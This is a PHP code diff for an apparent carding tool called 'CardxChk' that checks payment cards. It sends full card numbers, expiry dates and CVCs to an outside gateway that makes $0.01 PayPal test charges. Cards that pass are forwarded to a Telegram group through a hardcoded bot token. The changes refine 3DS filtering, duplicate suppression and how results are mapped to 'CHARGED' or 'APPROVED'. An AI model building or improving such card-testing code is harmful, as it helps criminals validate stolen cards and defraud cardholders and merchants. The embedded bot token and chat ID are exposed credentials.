@@ -55,13 +55,20 @@ function log_message($message) {
     file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
 }
 
+// Track sent notifications to prevent duplicates
+ $sent_notifications = [];
+
 // Function to check for 3DS responses
 function is3DAuthenticationResponse($response) {
     $responseUpper = strtoupper($response);
     return strpos($responseUpper, '3D_AUTHENTICATION') !== false ||
            strpos($responseUpper, '3DS') !== false ||
            strpos($responseUpper, 'THREE_D_SECURE') !== false ||
-           strpos($responseUpper, 'REDIRECT') !== false;
+           strpos($responseUpper, 'REDIRECT') !== false ||
+           strpos($responseUpper, 'VERIFICATION_REQUIRED') !== false ||
+           strpos($responseUpper, 'ADDITIONAL_AUTHENTICATION') !== false ||
+           strpos($responseUpper, 'AUTHENTICATION_REQUIRED') !== false ||
+           strpos($responseUpper, 'CHALLENGE_REQUIRED') !== false;
 }
 
 // Function to format response (remove status prefix and brackets)
@@ -78,18 +85,39 @@ function formatResponse($response) {
 }
 
 // Function to send Telegram notification
-function sendTelegramNotification($card_details, $status, $response) {
+function sendTelegramNotification($card_details, $status, $response, $originalApiResponse = null) {
+    global $sent_notifications;
+    
+    // Create a unique key for this card to prevent duplicates
+    $notification_key = md5($card_details . $status . $response);
+    
+    // Check if we've already sent this notification
+    if (isset($sent_notifications[$notification_key])) {
+        log_message("Skipping duplicate notification for $card_details: $status");
+        return;
+    }
+    
+    // Mark this notification as sent
+    $sent_notifications[$notification_key] = true;
+    
+    // Check both formatted response and original API response for 3DS
+    $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
+    if (is3DAuthenticationResponse($checkResponse)) {
+        log_message("Skipping Telegram notification for 3DS response: $checkResponse");
+        return;
+    }
+    
+    // Only proceed if status is CHARGED or APPROVED
+    if ($status !== 'CHARGED' && $status !== 'APPROVED') {
+        log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
+        return;
+    }
+
     // Load Telegram Bot Token from environment (secure storage)
     $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
     $chat_id = '-1003204998888'; // Your group chat ID
     $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
     $site_link = 'https://cxchk.site';
-
-    // Skip 3DS responses
-    if (is3DAuthenticationResponse($response)) {
-        log_message("Skipping Telegram notification for 3DS response: $response");
-        return;
-    }
 
     // Get user info from session
     $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
@@ -114,15 +142,15 @@ function sendTelegramNotification($card_details, $status, $response) {
         'chat_id' => $chat_id,
         'text' => $message,
         'parse_mode' => 'HTML',
-        'disable_web_page_preview' => true  // Added to prevent link previews
+        'disable_web_page_preview' => true
     ];
 
     $ch = curl_init($telegram_url);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Changed to true for security
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Added timeout
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
     $result = curl_exec($ch);
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     $curl_error = curl_error($ch);
@@ -141,7 +169,6 @@ if (!isset($_POST['card']) || !is_array($_POST['card'])) {
     exit;
 }
 
-
 // Function to check a single card via PayPal 0.1$ API
 function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
     $card_details = "$card_number|$exp_month|$exp_year|$cvc";
@@ -149,6 +176,9 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
     $api_url = "https://rocks-y.onrender.com/gateway=paypal0.1$/cc=?cc=$encoded_cc";
     log_message("Checking card: $card_details, URL: $api_url");
 
+    $last_response = null;
+    $last_result = null;
+    
     for ($attempt = 0; $attempt <= $retry; $attempt++) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $api_url);
@@ -166,6 +196,9 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
 
         log_message("Attempt " . ($attempt + 1) . " for $card_details: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response, 0, 200));
 
+        // Store the response for potential notification
+        $last_response = $response;
+
         // Handle API errors
         if ($response === false || $http_code !== 200 || !empty($curl_error)) {
             if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry) {
@@ -174,47 +207,49 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
                 continue;
             }
             log_message("Failed for $card_details: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
-            return "DECLINED [API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)]";
+            $last_result = "DECLINED [API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)]";
+            return $last_result;
         }
 
         // Parse JSON response
         $result = json_decode($response, true);
         if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'])) {
             log_message("Invalid JSON for $card_details: " . substr($response, 0, 200));
-            return "DECLINED [Invalid API response: " . substr($response, 0, 200) . "]";
+            $last_result = "DECLINED [Invalid API response: " . substr($response, 0, 200) . "]";
+            return $last_result;
         }
 
-        $status = $result['status'];
-        $message = $result['response'] ?? 'Unknown error';
+        // Convert to uppercase for consistent comparison
+        $status = strtoupper($result['status'] ?? '');
+        $message = strtoupper($result['response'] ?? '');
 
         // Map API response to status
         $final_status = 'DECLINED';
-        $response_msg = htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
+        $response_msg = htmlspecialchars($result['response'] ?? 'Unknown error', ENT_QUOTES, 'UTF-8');
 
-        if ($status === 'charged') {
-            $final_status = 'CHARGED';
-        } elseif ($status === 'approved' || $message === 'EXISTING_ACCOUNT_RESTRICTED') {
-            $final_status = 'APPROVED';
-        } elseif ($message === 'CARD ADDED') {
+        // Only set CHARGED status when message is exactly "CARD ADDED"
+        if ($message === 'CARD ADDED') {
             $final_status = 'CHARGED';
             $response_msg = 'Your $0.01 payment was successful.';
-        } elseif ($status === 'declined') {
+        } elseif ($status === 'APPROVED' || $message === 'EXISTING_ACCOUNT_RESTRICTED') {
+            $final_status = 'APPROVED';
+        } elseif ($status === 'DECLINED') {
             $final_status = 'DECLINED';
         }
 
-        $result_string = "$final_status [$response_msg]";
+        $last_result = "$final_status [$response_msg]";
         log_message("$final_status for $card_details: $response_msg");
 
-        // Send Telegram notification for CHARGED or APPROVED
-        if ($final_status === 'CHARGED' || $final_status === 'APPROVED') {
-            sendTelegramNotification($card_details, $final_status, $result_string);
-        }
-
-        return $result_string;
+        // If we got a valid response, don't retry
+        break;
     }
 
-    log_message("Failed after retries for $card_details");
-    return "DECLINED [API request failed after retries]";
+    // Send Telegram notification for CHARGED or APPROVED (only once)
+    if ($final_status === 'CHARGED' || $final_status === 'APPROVED') {
+        sendTelegramNotification($card_details, $final_status, $last_result, $last_response);
+    }
+
+    return $last_result;
 }
 
 // Function to check multiple cards in parallel
@@ -227,6 +262,7 @@ function checkCardsParallel($cards, $max_concurrent = 3) {
     $chs = [];
     $results = [];
     $processed = 0;
+    $card_details_map = []; // Store card details for each index
 
     foreach ($cards as $index => $card) {
         if ($processed >= $max_concurrent) {
@@ -251,6 +287,7 @@ function checkCardsParallel($cards, $max_concurrent = 3) {
         }
 
         $card_details = "$card_number|$exp_month|$exp_year|$cvc";
+        $card_details_map[$index] = $card_details;
         $encoded_cc = urlencode($card_details);
         $api_url = "https://rocks-y.onrender.com/gateway=paypal0.1$/cc=?cc=$encoded_cc";
 
@@ -295,27 +332,28 @@ function checkCardsParallel($cards, $max_concurrent = 3) {
             continue;
         }
 
-        $status = $result['status'];
-        $message = $result['response'] ?? 'Unknown error';
+        // Convert to uppercase for consistent comparison
+        $status = strtoupper($result['status'] ?? '');
+        $message = strtoupper($result['response'] ?? '');
 
         $final_status = 'DECLINED';
-        if ($status === 'charged') {
+        $response_msg = $result['response'] ?? 'Unknown error';
+        
+        if ($message === 'CARD ADDED') {
             $final_status = 'CHARGED';
-        } elseif ($status === 'approved' || $message === 'EXISTING_ACCOUNT_RESTRICTED') {
+            $response_msg = 'Your $0.01 payment was successful.';
+        } elseif ($status === 'APPROVED' || $message === 'EXISTING_ACCOUNT_RESTRICTED') {
             $final_status = 'APPROVED';
-        } elseif ($message === 'CARD ADDED') {
-            $final_status = 'CHARGED';
-            $message = 'Your $0.01 payment was successful.';
-        } elseif ($status === 'declined') {
+        } elseif ($status === 'DECLINED') {
             $final_status = 'DECLINED';
         }
 
-        $results[$index] = "$final_status [$message]";
-        log_message("Parallel result for card $index: $final_status [$message]");
+        $results[$index] = "$final_status [$response_msg]";
+        log_message("Parallel result for card $index: $final_status [$response_msg]");
 
         // Send Telegram notification for CHARGED or APPROVED
         if ($final_status === 'CHARGED' || $final_status === 'APPROVED') {
-            sendTelegramNotification($cards[$index]['number'] . '|' . $exp_month . '|' . $exp_year . '|' . $cvc, $final_status, $results[$index]);
+            sendTelegramNotification($card_details_map[$index], $final_status, $results[$index], $response);
         }
     }
 
